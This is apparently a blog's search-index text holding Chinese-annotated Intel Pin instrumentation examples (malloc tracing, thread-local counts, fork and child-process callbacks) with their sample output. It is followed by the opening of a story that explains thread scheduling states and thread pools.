main(int argc, char* argv[]) { // Write to a file since cout and cerr maybe closed by the application out = new std::ofstream(\"safecopy.out\"); // 初始化Pin，初始化符号 if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // 注册EmulateLoad函数以进行插桩 INS_AddInstrumentFunction(EmulateLoad, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:8","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"9. Order of Instrumentation Pin提供了多种方式来控制analysis call的执行顺序，主要取决于insertion action(IPOINT)和call order(CALL_ORDER)。 执行和查看输出： $ ../../../pin -t obj-ia32/invocation.so -- obj-ia32/little_malloc $ head invocation.out After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x63a12e After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x641c76 After: IP = 0x641ca6 After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x648b02 源码source/tools/ManualExamples/invocation.cpp： #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::dec; using std::endl; using std::hex; using std::ios; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"invocation.out\", \"specify output file name\"); ofstream OutFile; /* * Analysis routines */ VOID Taken(const CONTEXT* ctxt) { ADDRINT TakenIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Taken: IP = \" \u003c\u003c hex \u003c\u003c TakenIP \u003c\u003c dec \u003c\u003c endl; } VOID Before(CONTEXT* ctxt) { ADDRINT BeforeIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Before: IP = \" \u003c\u003c hex \u003c\u003c BeforeIP \u003c\u003c dec \u003c\u003c endl; } VOID After(CONTEXT* ctxt) { ADDRINT AfterIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"After: IP = \" \u003c\u003c hex \u003c\u003c AfterIP \u003c\u003c dec \u003c\u003c endl; } /* * Instrumentation routines */ VOID ImageLoad(IMG img, VOID* v) { for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { // RTN_InsertCall()和INS_InsertCall()谁先出现谁先执行 // 在下面的代码中，IPOINT_AFTER在IPOINT_BEFORE之前执行。 for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // 打开RTN. RTN_Open(rtn); // IPOINT_AFTER通过在一个routine中对每个return指令插桩实现。 // Pin会尝试查找所有的return指令，成不成功则是另外一回事（有点可爱23333）。 RTN_InsertCall(rtn, IPOINT_AFTER, (AFUNPTR)After, IARG_CONTEXT, IARG_END); // 检查routine中的每条指令 for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { if (INS_IsRet(ins)) { // 插桩每条return指令 // IPOINT_TAKEN_BRANCH总是最后使用 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)Before, IARG_CONTEXT, IARG_END); INS_InsertCall(ins, IPOINT_TAKEN_BRANCH, (AFUNPTR)Taken, IARG_CONTEXT, IARG_END); } } // 关闭RTN. RTN_Close(rtn); } } } VOID Fini(INT32 code, VOID* v) { OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This is the invocation pintool\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // 注册ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); PIN_AddFiniFunction(Fini, 0); // 写入到文件 OutFile.open(KnobOutputFile.Value().c_str()); OutFile.setf(ios::showbase); // 开始执行，无返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:9","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"10. Finding the Value of Function Arguments 功能：使用RTN_InsertCall()查看函数参数 执行和查看输出： $ ../../../pin -t obj-intel64/malloctrace.so -- /bin/cp makefile obj-intel64/malloctrace.so.makefile.copy $ cat malloctrace.out malloc(0x5a1) returns 0x7f87d8ce2190 malloc(0x4a1) returns 0x7f87d8ce2740 malloc(0x10) returns 0x7f87d8ce2bf0 malloc(0x9d) returns 0x7f87d8ce2c00 malloc(0x28) returns 0x7f87d8ce2ca0 malloc(0x140) returns 0x7f87d8ce2cd0 malloc(0x26) returns 0x7f87d8ce2e10 free(0) malloc(0x4b0) returns 0x7f87c4428000 malloc(0x26) returns 0x7f87c44284b0 malloc(0x22) returns 0x7f87c44284e0 free(0) ... ... 源码source/tools/ManualExamples/malloctrace.cpp: #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; using std::hex; using std::ios; using std::string; /* ===================================================================== */ /* Names of malloc and free */ /* ===================================================================== */ #if defined(TARGET_MAC) #define MALLOC \"_malloc\" #define FREE \"_free\" #else #define MALLOC \"malloc\" #define FREE \"free\" #endif /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ std::ofstream TraceFile; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloctrace.out\", \"specify trace file name\"); /* ===================================================================== */ /* ===================================================================== */ /* Analysis routines */ /* ===================================================================== */ VOID Arg1Before(CHAR* name, ADDRINT size) { TraceFile \u003c\u003c name \u003c\u003c \"(\" \u003c\u003c size \u003c\u003c \")\" \u003c\u003c endl; } VOID MallocAfter(ADDRINT ret) { TraceFile \u003c\u003c \" returns \" \u003c\u003c ret \u003c\u003c endl; } /* ===================================================================== */ /* Instrumentation routines */ /* ===================================================================== */ VOID Image(IMG img, VOID* v) { // 对malloc和free函数进行插桩，打印出每个malloc或free函数的输入参数以及malloc的返回值 // 首先，查找malloc函数 RTN mallocRtn = RTN_FindByName(img, MALLOC); if (RTN_Valid(mallocRtn)) { RTN_Open(mallocRtn); // 对查找到的malloc()函数进行插桩打印其参数 RTN_InsertCall(mallocRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, MALLOC, IARG_FUNCARG_ENTRYPOINT_VALUE, 0,IARG_END); // 打印返回值 RTN_InsertCall(mallocRtn, IPOINT_AFTER, (AFUNPTR)MallocAfter, IARG_FUNCRET_EXITPOINT_VALUE, IARG_END); RTN_Close(mallocRtn); } // 查找free() RTN freeRtn = RTN_FindByName(img, FREE); if (RTN_Valid(freeRtn)) { RTN_Open(freeRtn); // 插桩，打印输入参数 RTN_InsertCall(freeRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, FREE, IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_END); RTN_Close(freeRtn); } } VOID Fini(INT32 code, VOID* v) { TraceFile.close(); } /* Print Help Message */ INT32 Usage() { cerr \u003c\u003c \"This tool produces a trace of calls to malloc.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // 写入到文件 TraceFile.open(KnobOutputFile.Value().c_str()); TraceFile \u003c\u003c hex; TraceFile.setf(ios::showbase); // 注册Image函数 IMG_AddInstrumentFunction(Image, 0); PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:10","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"11. Instrumenting Threaded Applications 功能：在应用开启了线程环境下进行插桩，使用的callback为ThreadStart()和ThreadFini()。在使用时，为了防止与其他分析routine发生共享资源竞争的问题，可以使用PIN_GetLock()函数进行加锁处理。 执行和查看输出： $ ../../../pin -t obj-ia32/malloc_mt.so -- obj-ia32/thread_lin $ head malloc_mt.out thread begin 0 thread 0 entered malloc(24d) thread 0 entered malloc(57) thread 0 entered malloc(c) thread 0 entered malloc(3c0) thread 0 entered malloc(c) thread 0 entered malloc(58) thread 0 entered malloc(56) thread 0 entered malloc(19) thread 0 entered malloc(25c) 源码source/tools/ManualExamples/malloc_mt.cpp： #include \u003cstdio.h\u003e #include \"pin.H\" using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloc_mt.out\", \"specify output file name\"); //============================================================== // Analysis Routines //============================================================== // Note: threadid+1 作为PIN_GetLock()的参数使用，它的值也就是lock的值，所以不能为0 // lock会序列化对输出文件的访问。 FILE* out; PIN_LOCK pinLock; // 每次创建线程，该routine都会被调用执行。 VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); // 加锁 fprintf(out, \"thread begin %d\\n\", threadid); fflush(out); PIN_ReleaseLock(\u0026pinLock); // 解锁 } // 每次销毁线程，该routine都会被调用执行 VOID ThreadFini(THREADID threadid, const CONTEXT* ctxt, INT32 code, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread end %d code %d\\n\", threadid, code); fflush(out); PIN_ReleaseLock(\u0026pinLock); } // 每次调用malloc函数，该routine都会被调用执行 VOID BeforeMalloc(int size, THREADID threadid) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread %d entered malloc(%d)\\n\", threadid, size); fflush(out); PIN_ReleaseLock(\u0026pinLock); } //==================================================================== // Instrumentation Routines //==================================================================== // 对每个image都执行 VOID ImageLoad(IMG img, VOID*) { RTN rtn = RTN_FindByName(img, \"malloc\"); if (RTN_Valid(rtn)) { RTN_Open(rtn); RTN_InsertCall(rtn, IPOINT_BEFORE, AFUNPTR(BeforeMalloc), IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_THREAD_ID, IARG_END); RTN_Close(rtn); } } // 在结束时执行一次 VOID Fini(INT32 code, VOID* v) { fclose(out); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of malloc calls in the guest application\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { // 初始化pin的lock PIN_InitLock(\u0026pinLock); // 初始化pin if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); out = fopen(KnobOutputFile.Value().c_str(), \"w\"); // 注册ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 注册线程创建或结束时的分析routine PIN_AddThreadStartFunction(ThreadStart, 0); PIN_AddThreadFiniFunction(ThreadFini, 0); // 注册程序退出时的fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:11","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"12. Using TLS(Thread Local Storage) 功能：可以使工具创建线程特定的数据 执行和查看输出： $ ../../../pin -t obj-ia32/inscount_tls.so -- obj-ia32/thread_lin $ head Count[0]= 237993 Count[1]= 213296 Count[2]= 209223 Count[3]= 209223 Count[4]= 209223 Count[5]= 209223 Count[6]= 209223 Count[7]= 209223 Count[8]= 209223 Count[9]= 209223 源码source/tools/ManualExamples/inscount_tls.cpp： #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::cout; using std::endl; using std::ostream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"\", \"specify output file name\"); INT32 numThreads = 0; ostream* OutFile = NULL; // 强制每个线程的数据存储在自己的数据缓存行中，确保多线程不会发生同一数据缓存行的竞争问题。 // 避免错误共享的问题。 #define PADSIZE 56 // 64 byte line size: 64-8 // 运行的指令计数 class thread_data_t { public: thread_data_t() : _count(0) {} UINT64 _count; UINT8 _pad[PADSIZE]; }; // 存储在线程中的访问TLS的key，只在main函数中初始化一次 static TLS_KEY tls_key = INVALID_TLS_KEY; // 该函数在每个block前调用 VOID PIN_FAST_ANALYSIS_CALL docount(UINT32 c, THREADID threadid) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadid)); tdata-\u003e_count += c; } VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { numThreads++; thread_data_t* tdata = new thread_data_t; if (PIN_SetThreadData(tls_key, tdata, threadid) == FALSE) { cerr \u003c\u003c \"PIN_SetThreadData failed\" \u003c\u003c endl; PIN_ExitProcess(1); } } // 遇到新的代码块时调用，插入对docount函数的调用 VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对每个bbl插入对docount的调用，并传递参数：指令的数量 BBL_InsertCall(bbl, IPOINT_ANYWHERE, (AFUNPTR)docount, IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_THREAD_ID, IARG_END); } } // 线程退出时调用 VOID ThreadFini(THREADID threadIndex, const CONTEXT* ctxt, INT32 code, VOID* v) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadIndex)); *OutFile \u003c\u003c \"Count[\" \u003c\u003c decstr(threadIndex) \u003c\u003c \"] = \" \u003c\u003c tdata-\u003e_count \u003c\u003c endl; delete tdata; } // 程序退出时调用 VOID Fini(INT32 code, VOID* v) { *OutFile \u003c\u003c \"Total number of threads = \" \u003c\u003c numThreads \u003c\u003c endl; } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return 1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) return Usage(); OutFile = KnobOutputFile.Value().empty() ? \u0026cout : new std::ofstream(KnobOutputFile.Value().c_str()); // 设置key tls_key = PIN_CreateThreadDataKey(NULL); if (tls_key == INVALID_TLS_KEY) { cerr \u003c\u003c \"number of already allocated keys reached the MAX_CLIENT_TLS_KEYS limit\" \u003c\u003c endl; PIN_ExitProcess(1); } // 注册线程创建时调用的ThreadStart函数 PIN_AddThreadStartFunction(ThreadStart, NULL); // 注册线程结束时调用的ThreadFini函数 PIN_AddThreadFiniFunction(ThreadFini, NULL); // 注册程序结束时的Fini函数 PIN_AddFiniFunction(Fini, NULL); // 注册指令插桩时调用的Trace函数 TRACE_AddInstrumentFunction(Trace, NULL); // Start the program, never returns PIN_StartProgram(); return 1; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:12","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"13. Finding the Static Properties of an Image 功能：不对binary文件进行插桩，静态获取文件的指令数量。 执行和查看输出： 源码source/tools/ManualExamples/staticcount.cpp： // // This tool prints a trace of image load and unload events // #include \u003cstdio.h\u003e #include \u003ciostream\u003e #include \"pin.H\" using std::cerr; using std::endl; // 在img加载时调用该函数，计算image中的静态指令数量 VOID ImageLoad(IMG img, VOID* v) { UINT32 count = 0; for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // 准备处理RTN，RTN并不会分解成bbl，只是INS的一个序列 RTN_Open(rtn); for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { count++; } // 在处理完与RTN相关的数据后就进行释放，以节省空间 RTN_Close(rtn); } } fprintf(stderr, \"Image %s has %d instructions\\n\", IMG_Name(img).c_str(), count); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool prints a log of image load and unload events\" \u003c\u003c endl; cerr \u003c\u003c \" along with static instruction counts for each image.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化符号 PIN_InitSymbols(); // 初始化pin if (PIN_Init(argc, argv)) return Usage(); // 注册img加载后要调用的ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:13","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"14. Instrumenting Child Processes 功能：在通过execv类命令获得进程开始前执行自定义的函数。 执行和查看输出：在执行时添加-follow_execv选项。 $ ../../../pin -follow_execv -t obj-intel64/follow_child_tool.so -- obj-intel64/follow_child_app1 obj-intel64/follow_child_app2 $ make follow_child_tool.test 源码source/tools/ManualExamples/follow_child_tool.cpp： #include \"pin.H\" #include \u003ciostream\u003e #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e /* ===================================================================== */ /* Command line Switches */ /* ===================================================================== */ BOOL FollowChild(CHILD_PROCESS cProcess, VOID* userData) { fprintf(stdout, \"before child:%u\\n\", getpid()); return TRUE; } /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { PIN_Init(argc, argv); // 注册子进程刚创建时要执行的FollowChild函数 PIN_AddFollowChildProcessFunction(FollowChild, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:14","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"15. Instrumenting Before and After Forks 功能：使用PIN_AddForkFunction()和PIN_AddForkFunctionProbed()回调函数来在以下的FPOINT处执行自定义函数： FPOINT_BEFORE Call-back in parent, just before fork. FPOINT_AFTER_IN_PARENT Call-back in parent, immediately after fork. FPOINT_AFTER_IN_CHILD Call-back in child, immediately after fork. PIN_AddForkFunction()工作在JIT模式下，PIN_AddForkFunctionProbed()工作在Probe模式下。 执行和查看输出： $ make fork_jit_tool.test 源码source/tools/ManualExamples/fork_jit_tool.cpp： #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; INT32 Usage() { cerr \u003c\u003c \"This pin tool registers callbacks around fork().\\n\" \"\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary(); cerr \u003c\u003c endl; return -1; } pid_t parent_pid; PIN_LOCK pinLock; VOID BeforeFork(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: Before fork.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); parent_pid = PIN_GetPid(); } VOID AfterForkInParent(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in parent.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if (PIN_GetPid() != parent_pid) { cerr \u003c\u003c \"PIN_GetPid() fails in parent process\" \u003c\u003c endl; exit(-1); } } VOID AfterForkInChild(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in child.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if ((PIN_GetPid() == parent_pid) || (getppid() != parent_pid)) { cerr \u003c\u003c \"PIN_GetPid() fails in child process\" \u003c\u003c endl; exit(-1); } } int main(INT32 argc, CHAR** argv) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // Initialize the pin lock PIN_InitLock(\u0026pinLock); // Register a notification handler that is called when the application // forks a new process. PIN_AddForkFunction(FPOINT_BEFORE, BeforeFork, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_PARENT, AfterForkInParent, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_CHILD, AfterForkInChild, 0); // Never returns PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:15","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["码农翻身"],"content":"码农翻身优质文章学习记录。","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第一回 初生牛犊 我是一个线程，我一出生就被编了个号：0x3704，然后被领到一个昏暗的屋子里，在这里我发现了很多和我一模一样的同伴。 // 线程id 我身边的同伴0x6900 待的时间比较长，他带着沧桑的口气对我说：“我们线程的宿命就是处理包裹。把包裹处理完以后还得马上回到这里，否则可能永远回不来了。” 我一脸懵懂，“包裹，什么包裹？” “不要着急，马上你就会明白了，我们这里是不养闲人的。” 果然，没多久，屋子的门开了， 一个面貌凶恶的家伙吼道：“0x3704 ,出来！” 我一出来就被塞了一个沉甸甸的包裹，上面还附带着一个写满了操作步骤的纸。 “快去，把这个包裹处理了。” “去哪儿处理？” “跟着指示走，先到就绪车间。” // 先进入就绪状态 果然，地上有指示箭头，跟着它来到了一间明亮的大屋子，这里已经有不少线程了，大家都很紧张，好像时刻准备着往前冲。 我刚一进来，就听见广播说：“0x3704，进入车间。” 我赶紧往前走，身后有很多人议论。 “他太幸运了，刚进入就绪状态就能运行。” // 未产生等待，直接从就绪状态转入运行状态 “是不是有关系？” “不是，你看人家的优先级多高啊，唉！” // 主要因为优先级高于其他线程 前边就是车间，这里简直是太美了，怪不得老线程总是唠叨着说：“要是能一直待在这里就好了。” // 线程一直处于运行状态，是每个线程的“程生理想” 这里空间大，视野好，空气清新，鸟语花香，还有很多从来没见过的人，像服务员一样等着为我服务。 他们也都有编号，更重要的是每个人还有个标签，上面写着：硬盘、数据库、内存、网卡…… // 线程运行涉及到的各种资源 我现在理解不了，看看操作步骤吧。 // CPU会指定线程需要做的事情 第一步：从包裹中取出参数。 打开包裹，里边有个HttpRequest对象，可以取到userName、 password两个参数。 第二步：执行登录操作。 奥，原来是有人要登录啊，我把userName、password交给数据库服务员，他拿着数据，慢腾腾地走了。 // 数据读写速度远远小于线程处理速度 他怎么这么慢？不过我是不是正好可以在车间里多待一会儿？反正也没法执行第三步。 就在这时，车间里的广播响了：“0x3704，我是CPU，记住你正在执行的步骤，然后马上带着包裹离开！” // CPU不会让空闲线程占用CPU 我慢腾腾地开始收拾。 // 保存线程的上下文 “快点，别的线程马上就要进来了。” // 快滚，别浪费资源 离开这个车间，又来到一个大屋子，这里有很多线程在慢腾腾地喝茶，打牌。 // 进入阻塞状态，小丑不是我自己，大家都在等CPU的执行权 “哥们，你们没事干了？” “你新来的吧，你不知道我在等数据库服务员给我数据啊！据说他们比我们慢好几十万倍，在这里好好歇吧。” // 数据的读写速度和处理速度不是一个量级 “啊？ 这么慢！我这里有人在登录系统，能等这么长时间吗？” “放心，你没听说过人间一天，CPU一年吗？我们这里是用纳秒、毫秒计时的，人间等待一秒，相当于我们好几天呢，来得及。” 干脆睡一会吧。不知道过了多久，大喇叭又开始广播了：“0x3704，你的数据来了，快去执行！” // 再次获得时间片，准备执行 我转身就往CPU车间跑，发现这里的门只出不进！ // 不能直接进入运行态 后面传来阵阵哄笑声：“果然是新人，不知道还得去就绪车间等。” // 先进入就绪状态 于是赶紧到就绪车间，这次没有那么好运了，等了好久才被再次叫进CPU车间。 // 在就绪状态等待其他线程的时间片执行完，说明有的线程的优先级比我高 在等待的时候，我听见有人小声议论： “听说了吗，最近有个线程被kill掉了。” “为啥啊？” “这家伙赖在CPU车间不走，把CPU利用率一直搞成100%，后来就被kill掉了。” // 一直占用CPU的，杀无赦 “Kill掉以后弄哪儿去了？” “可能被垃圾回收了吧。” // kill线程，并回收其占用的资源。CPU是很重视资源利用的，不允许半点浪费。 我心里打了个寒噤，赶紧接着处理，剩下的动作快多了，第二步登录成功。 第三步：构建登录成功后的主页。 这一步有点费时，因为有很多HTML需要处理，不知道代码谁写的，处理起来很烦人。 我正在紧张的制作HTML呢， CPU又开始叫了： “0x3704，我是CPU ，记住你正在执行的步骤，然后马上带着包裹离开！” // 再次被中断执行 “为啥啊？” “每个线程只能在CPU上运行一段时间，到了时间就得让别人用了，你去就绪车间待着，等着叫你吧。” // 时间片执行结束，不管执行到何种程度，退出执行，转入就绪状态 就这样，我一直在“就绪——运行”这两个状态中不知道轮转了多少次， 终于按照步骤清单把工作做完了。 // 多次的状态转换，直到动作执行完成 最后顺利地把包含html的包裹发了回去。至于登录以后干什么事儿，我就不管了。马上就要回到我那昏暗的房间了，真有点舍不得这里。不过相对于有些线程，我还是幸运的，他们运行完以后就被彻底地销毁了，而我还活着！ // 运行完后没有被销毁 回到了小黑屋，老线程0x6900问： “怎么样？第一天有什么感觉？” “我们的世界规则很复杂，首先你不知道什么时候会被挑中执行；第二，在执行的过程中随时可能被打断，让出CPU车间；第三，一旦出现硬盘、数据库这样耗时的操作，也得让出CPU去等待；第四，就是数据来了，你也不一定马上执行，还得等着CPU挑选。” // 线程运行的基本原则 “小伙子理解的不错啊。” “我不明白为什么很多线程执行完任务就死了，为什么咱们还活着？” “你还不知道？长生不老是我们的特权！我们这里有个正式的名称，叫作线程池！” // 因为属于线程池的线程，并没有在运行结束后被销毁 ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第二回 渐入佳境 平淡的日子就这么一天天地过去，作为一个线程，我每天的生活都是取包裹、处理包裹，然后回到我们昏暗的家：线程池。 有一天我回来的时候，听到有个兄弟说，今天要好好休息下，明天就是最疯狂的一天。我看了一眼日历，明天是 11月11号。 // 双11大战 